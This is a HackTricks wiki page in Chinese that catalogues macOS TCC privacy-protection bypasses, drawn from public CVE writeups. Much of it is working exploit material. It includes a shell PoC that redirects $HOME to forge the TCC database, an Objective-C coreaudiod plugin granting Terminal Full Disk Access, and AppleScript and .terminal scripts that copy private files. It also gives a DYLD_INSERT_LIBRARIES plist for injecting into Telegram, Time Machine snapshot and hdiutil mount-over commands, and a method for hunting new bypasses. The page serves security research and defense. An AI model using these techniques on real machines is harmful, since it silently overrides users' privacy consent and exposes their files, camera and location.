# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## 按功能分类

### 写入绕过

这不是一种 bypass，而只是 TCC 的工作方式：**它不会防止写入**。如果 Terminal **没有权限读取用户的 Desktop，它仍然可以向其中写入**：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** 会被添加到新的 **file**，以授予 **creators app** 读取该文件的权限。<sup>[[2]](#references)</sup>

### TCC ClickJacking

可以**在 TCC prompt 上方放置一个窗口**，让用户在未察觉的情况下**接受**它。你可以在 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking) 中找到 PoC**。**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

攻击者可以在 **`Info.plist`** 中**使用任意名称创建 apps**（例如 Finder、Google Chrome 等），并让其请求访问受 TCC 保护的位置。用户会认为是合法 application 请求了此访问权限。\
此外，还可以**将合法 app 从 Dock 中移除，并将伪造的 app 放入其中**。这样，当用户点击伪造 app 时（它可以使用相同的图标），该 app 就可以调用合法 app、请求 TCC permissions 并执行 malware，让用户相信是合法 app 请求了该访问权限。<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

更多信息和 PoC 见：


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

默认情况下，通过 **SSH 进行的访问曾拥有 "Full Disk Access"**。要禁用此权限，需要将其列出但禁用（从列表中移除并不会移除这些 privileges）：<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

这里可以找到一些 **malwares 绕过此保护的示例**：

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> 注意，现在要启用 SSH，必须拥有 **Full Disk Access**

### Handle extensions - CVE-2022-26767

文件会被赋予 **`com.apple.macl`** 属性，以授予**某个 application 读取该文件的权限。**当用户将文件**拖放**到 app 上，或**双击**文件并使用**默认 application**打开时，系统会设置此属性。

因此，用户可能会**注册一个恶意 app** 来处理所有扩展名，并调用 Launch Services **打开**任意文件（这样恶意文件就会被授予读取该文件的权限）。<sup>[[23]](#references)</sup>

### iCloud

通过 entitlement **`com.apple.private.icloud-account-access`**，可以与 **`com.apple.iCloudHelper`** XPC service 通信，该 service 会**提供 iCloud tokens**。

**iMovie** 和 **Garageband** 曾拥有此 entitlement 以及其他允许执行相关操作的 entitlements。

有关利用该 entitlement **获取 icloud tokens** 的 exploit 的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

拥有 **`kTCCServiceAppleEvents`** permission 的 app 将能够**控制其他 Apps**。这意味着它可能能够**滥用其他 Apps 获得的 permissions**。<sup>[[2]](#references)</sup>

有关 Apple Scripts 的更多信息，请查看：


{{#ref}}
macos-apple-scripts.md
{{#endref}}

例如，如果某个 App 拥有对 **`iTerm`** 的 **Automation permission**，在此示例中，**`Terminal`** 就可以访问 iTerm：

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

没有 FDA 的 Terminal 可以调用拥有 FDA 的 iTerm，并利用它执行操作：
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### 通过 Finder

或者，如果某个 App 通过 Finder 具有访问权限，它可以执行类似这样的 script：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## 按 App 行为

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

用户态的 **tccd daemon** 使用 **`HOME`** **env** 变量从以下位置访问 TCC 用户数据库：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

根据 [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)，并且由于 TCC daemon 通过 `launchd` 在当前用户的 domain 中运行，因此可以 **控制传递给它的所有环境变量**。<sup>[[19]](#references)</sup>\
因此，**攻击者可以在 `launchctl` 中设置 `$HOME` 环境**变量，使其指向一个由其**控制的** **目录**，然后**重启** **TCC** daemon，接着**直接修改 TCC 数据库**，从而在完全不提示最终用户的情况下，为自己授予所有可用的 TCC entitlement。<sup>[[1]](#references)</sup>\
PoC：
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes 可以访问受 TCC 保护的位置，但新创建的 note **存储在非受保护的位置**。因此，攻击者可以要求 Notes 将受保护的文件复制到 note 中，然后从非受保护的位置访问生成的数据：

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

二进制文件 `/usr/libexec/lsd` 使用库 `libsecurity_translocate`，具有 `com.apple.private.nullfs_allow` entitlement，允许其创建 **nullfs** mount；同时具有带 **`kTCCServiceSystemPolicyAllFiles`** 的 entitlement `com.apple.private.tcc.allow`，因此可以访问所有文件。

攻击者可以为 "Library" 添加 quarantine attribute，调用 **`com.apple.security.translocation`** XPC service，之后它会将 Library 映射到 **`$TMPDIR/AppTranslocation/d/d/Library`**，从而可以**访问** Library 中的所有文档。

### CVE-2024-44131 - FileProvider symlink race

将文件操作交给 **privileged helper** 的应用（此处为 **`fileproviderd`** / **`Files.app`**）会**代表用户**复制或移动项目，因此复制操作使用 helper 的 privileges，而不是调用者的 privileges。

Jamf Threat Labs 表明，操作前执行的 symlink 验证可能遭遇 **race**：攻击者不在**最后**一个路径组件（也就是被检查的组件）上放置 symlink，而是在复制已经开始后替换路径中的**中间**目录。随后，privileged helper 会跟随攻击者控制的 link，在**完全不显示 prompt** 的情况下读取/写入受 TCC 保护的位置。<sup>[[5]](#references)</sup>

路径中没有由随机 UUID 保护的目录（例如 `~/Library/Mobile Documents/com~apple~CloudDocs`）是最容易攻击的目标，因为攻击者可以预测用于 race 的完整路径。

> [!TIP]
> 这是需要查找的通用模式：**任何解析路径超过一次的 privileged process**（check-then-use，或分别解析 source 和 destination 的 `rename()`/`copyfile()`）都可能通过替换路径中间的目录而遭遇 race。只有 `O_NOFOLLOW_ANY`、对已打开目录 FD 使用 `openat()`，或 `realpath()` + 重新验证，才能真正关闭这个窗口。

更多信息请参阅 [**Jamf Threat Labs 的 writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)。<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` 可以使用 `SQLITE_ENABLE_SQLLOG` 构建，该选项会添加由 environment variables 驱动的 logging hook（上游的 `test_sqllog.c`）：<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – 对于**每个被打开的 database**，都会将**database file 的副本**以及 SQL statements 的 log 写入 `path`（该 directory 必须已经存在）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – 每次打开/attach DB 时都创建一份**全新的副本**，而不是重复使用同一份。
- **`SQLITE_SQLLOG_CONDITIONAL`** – 仅当 main DB 旁边存在 `<database>-sqllog` 文件时，才记录该 connection。

如果你可以将此 variable 注入具有 **FDA** 且会打开 SQLite databases 的 process，它就会将这些受保护的 databases **复制到你控制的 directory** 中。由于 destination filename 源自攻击者控制的数据，在 destination 处预先放置 **symlink**，就可以将同一 primitive 转化为使用 target process privileges 执行的**任意文件写入**。

### **SQLITE_AUTO_TRACE**

如果设置了 environment variable **`SQLITE_AUTO_TRACE`**，library **`libsqlite3.dylib`** 将开始 **logging** 所有 SQL queries。许多 applications 使用了此 library，因此可以记录它们的所有 SQLite queries。<sup>[[22]](#references)</sup>

一些 Apple applications 使用此 library 访问受 TCC 保护的信息。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### 寻找由 env-var 驱动的文件写入

前两个条目属于同一种通用技术，值得继续寻找更多实例：**加载到具有 TCC 权限的应用中的 frameworks，通常会暴露 debug/logging 环境变量，使进程在调用者控制的路径创建文件**。

寻找流程：

1. 选择一个具有 FDA 或其他有价值 TCC 权限的目标（`Music`、`TV`、`Terminal`、MDM agents 等），并列出它链接的 frameworks（`otool -L`、`vmmap`）。
2. 在这些 frameworks 中 grep `getenv` 字符串：`strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`。
3. 通过 `launchctl setenv NAME /path/you/control` 设置候选变量，启动应用，并使用 `fs_usage -w -f filesys <pid>` 或 `sudo fs_usage | grep <path>` 观察它对文件系统执行的操作。
4. 如果进程在你的目录中**创建或重命名**文件，你就获得了一个写入原语：将目标指向一个 symlink（或像上面的 CVE-2024-44131 一样竞争中间目录），将其重定向到 `~/Library/Application Support/com.apple.TCC/TCC.db`。

> [!TIP]
> 有两点会限制这一点。首先，**对于 hardened-runtime binaries，`DYLD_*` 变量会被忽略**，除非应用包含 [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement（“一个 Boolean 值，表示应用是否可能受到 dynamic linker environment variables 的影响，你可以使用它们向应用进程注入代码”）——另请参阅 [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)。其次，Apple 会在 framework debug 变量被报告后移除相应变量，因此在某个 macOS 版本中有效的变量，通常会在下一个版本中消失。如果设置某个变量后应用静默拒绝启动，应将该变量视为已经被过滤。<sup>[[7]](#references)[[8]](#references)</sup>

请查看 [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)，了解使用 linker variables 实现相同技巧的方法。

### Apple Remote Desktop

作为 root，你可以启用此服务，而 **ARD agent 将拥有 full disk access**；随后，用户可以滥用该权限，使其复制一个新的 **TCC user database**。

## 通过 **NFSHomeDirectory**

TCC 使用用户 HOME 文件夹中的数据库控制对用户特定资源的访问，路径为 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
因此，如果用户能够使用指向**不同文件夹**的 $HOME env variable 重启 TCC，用户就可以在 **/Library/Application Support/com.apple.TCC/TCC.db** 中创建一个新的 TCC database，并诱使 TCC 向任意 app 授予任意 TCC permission。

> [!TIP]
> 注意，Apple 使用用户 profile 中 **`NFSHomeDirectory`** attribute 所存储的设置作为 **`$HOME`** 的值。因此，如果你 compromise 了一个具有修改此值权限（**`kTCCServiceSystemPolicySysAdminFiles`**）的应用，就可以通过 TCC bypass **weaponize** 此选项。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**第一个 POC** 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 和 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 修改用户的 **HOME** 文件夹。

1. 获取目标 app 的 _csreq_ blob。
2. 使用所需的 access 和 _csreq_ blob 放置一个伪造的 _TCC.db_ 文件。
3. 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 导出用户的 Directory Services entry。
4. 修改 Directory Services entry，改变用户的 home directory。
5. 使用 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 导入修改后的 Directory Services entry。
6. 停止用户的 _tccd_ 并重启该进程。

第二个 POC 使用了带有 `com.apple.private.tcc.allow`（值为 `kTCCServiceSystemPolicySysAdminFiles`）的 **`/usr/libexec/configd`**。\
可以使用 **`-t`** 选项运行 **`configd`**，攻击者能够指定要加载的 **custom Bundle**。因此，该 exploit 使用 **`configd` code injection** 替换了通过 **`dsexport`** 和 **`dsimport`** 修改用户 home directory 的方法。

更多信息请查看 [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。<sup>[[11]](#references)</sup>

## 通过 process injection

有多种技术可以向进程内部注入代码，并滥用其 TCC 权限：


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

此外，已发现最常见的用于 bypass TCC 的 process injection 是通过 **plugins (load library)** 实现的。\
Plugins 通常是以 libraries 或 plist 形式存在的额外代码，会由 **main application 加载**并在其 context 下执行。因此，如果 main application 能够访问受 TCC 限制的文件（通过已授予的 permissions 或 entitlements），**custom code 也将拥有该访问权限**。

### CVE-2020-27937 - Directory Utility

应用 `/System/Library/CoreServices/Applications/Directory Utility.app` 具有 **`kTCCServiceSystemPolicySysAdminFiles`** entitlement，加载扩展名为 **`.daplug`** 的 plugins，且**没有启用 hardened** runtime。

要 weaponize 此 CVE，需要修改 **`NFSHomeDirectory`**（滥用前述 entitlement），以**接管用户的 TCC database** 并 bypass TCC。

更多信息请查看 [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

binary **`/usr/sbin/coreaudiod`** 具有 entitlements `com.apple.security.cs.disable-library-validation` 和 `com.apple.private.tcc.manager`。前者**允许 code injection**，后者则赋予其**管理 TCC 的权限**。

该 binary 允许从 `/Library/Audio/Plug-Ins/HAL` 文件夹加载**第三方 plug-ins**。因此，可以使用此 POC **加载 plugin 并滥用 TCC permissions**：<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
更多信息请查看 [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

通过 Core Media I/O 打开 camera stream 的系统应用（具有 **`kTCCServiceCamera`** 的应用）会在进程中加载位于 `/Library/CoreMediaIO/Plug-Ins/DAL` 的这些 plugins（不受 SIP 限制）。

只需在其中存放一个包含通用 **constructor** 的 library，即可实现 **inject code**。

多款 Apple 应用都存在此漏洞。

### Firefox

Firefox 应用具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.security.cs.allow-dyld-environment-variables` entitlements：<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
有关如何轻松 exploit 的更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。<sup>[[14]](#references)</sup>

### CVE-2020-10006

二进制文件 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` 具有 **`com.apple.private.tcc.allow`** 和 **`com.apple.security.get-task-allow`** entitlements，因此可以向进程内部注入代码并使用 TCC 权限。

### CVE-2023-26818 - Telegram

Telegram 具有 **`com.apple.security.cs.allow-dyld-environment-variables`** 和 **`com.apple.security.cs.disable-library-validation`** entitlements，因此可以滥用它来**获取其权限**，例如使用 camera 进行录制。你可以在[**writeup 中找到 payload**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。<sup>[[15]](#references)</sup>

注意，为了使用 env variable 加载 library，创建了一个**自定义 plist** 来注入该 library，并使用 **`launchctl`** 启动它：<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## 通过 open 调用

即使处于 sandboxed 状态，也可以调用 **`open`**

### 终端脚本

在技术人员使用的计算机上，为终端授予 **Full Disk Access (FDA)** 是很常见的。也可以利用它调用 **`.terminal`** 脚本。

**`.terminal`** 脚本是类似以下内容的 plist 文件，其中要执行的命令位于 **`CommandString`** 键中：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
应用程序可以在诸如 /tmp 的位置写入终端脚本，并使用如下命令启动它：
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## 通过挂载

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**任何用户**（即使是非特权用户）都可以创建并挂载一个 Time Machine 快照，并**访问该快照中的所有文件**。\
唯一需要的**特权**是所使用的应用程序（如 `Terminal`）必须具有 **Full Disk Access**（FDA）访问权限（`kTCCServiceSystemPolicyAllfiles`），而该权限必须由管理员授予。<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
更详细的解释可以在[**原始报告中找到**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - 覆盖挂载 TCC 文件

即使 TCC DB 文件受到保护，也可以**在该目录上覆盖挂载**一个新的 TCC.db 文件：
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
查看[**原始文章**](https://theevilbit.github.io/posts/cve-2021-30808)中的**完整 exploit**。<sup>[[21]](#references)</sup>

### CVE-2024-40855

正如[原始文章](https://www.kandji.io/blog/macos-audit-story-part2)中所述，该 CVE 利用了 `diskarbitrationd`。<sup>[[16]](#references)</sup>

公共 `DiskArbitration` framework 中的 `DADiskMountWithArgumentsCommon` 函数执行了安全检查。不过，可以通过直接调用 `diskarbitrationd` 绕过该检查，从而在路径中使用 `../` 元素和 symlink。

由于 `diskarbitrationd` 具有 `com.apple.private.security.storage-exempt.heritable` entitlement，攻击者可以在任意位置执行 mount，包括覆盖 TCC 数据库。

### asr

**`/usr/sbin/asr`** 工具可以复制整个磁盘，并将其 mount 到其他位置，从而绕过 TCC 保护。

### CVE-2022-22655 - Location Services

Location Services **不像其他服务那样**存储在 TCC 数据库中。它们由 `locationd` 管理，后者在 **`/var/db/locationd/clients.plist`** 中维护自己的 allow-list：<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
每个条目都由客户端（bundle ID 或可执行文件路径）作为键，并包含 `Authorized`、`BundleId`、`Executable` 和 `Registered` 等字段。<sup>[[4]](#references)</sup>

`clients.plist` 文件本身受到 Sandbox/TCC 保护，即使以 root 身份运行也无法编辑——但 **`/var/db/locationd/` 目录并未受到挂载保护**。因此，以 root 身份运行的攻击者可以创建一个包含自定义 `clients.plist` 的磁盘映像（并将其二进制文件标记为 `Authorized`），将其挂载到该目录之上，然后重启 `locationd`，使伪造的 allow-list 生效。<sup>[[3]](#references)</sup>

> [!TIP]
> 这与上面的 `hdiutil`/`mount` TCC bypasses 使用的是相同模式：受保护的是*文件*，而不是其所在的*目录*，因此可以替换整个目录，而不是替换文件。

## 通过启动应用

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## 通过 grep

在某些情况下，文件会将 emails、电话号码、消息等敏感信息存储在未受保护的位置（这在 Apple 体系中属于 vulnerability）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

这现在已经不起作用了，但[**过去确实有效**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**：**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

另一种使用 [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) 的方式：<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934：绕过 macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [意外且有意地绕过 macOS TCC User Privacy Protections](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass（原始报告）](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Carmen Sandiego 身在何处：滥用 macOS 上的 Location Services](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131：TCC bypass 从 iCloud 窃取数据](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c`（SQLITE_ENABLE_SQLLOG 环境变量）](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization：hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [在 XCSSET malware 中发现的 Zero-Day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0：“What Happens on your Mac, Stays on Apple's iCloud?!” - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [新的 macOS vulnerability，“powerdir”可能导致未经授权的用户数据访问](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [更改 home directory 并绕过 TCC，即 CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [播放音乐并绕过 TCC，即 CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [如何窃取一只 (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - 在 macOS 中使用 Telegram 绕过 TCC](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - 揭示 Apple Vulnerabilities：diskarbitrationd 和 storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0：Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - 在 OS X 上设置环境变量](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771：mount_apfs TCC bypass 和 privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808：通过挂载到 TCC database 之上实现 TCC bypass](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [20+ 种绕过 macOS Privacy Mechanisms 的方法](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [针对 TCC 的 Knockout Win - 20+ 种绕过 MacOS Privacy Mechanisms 的新方法](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
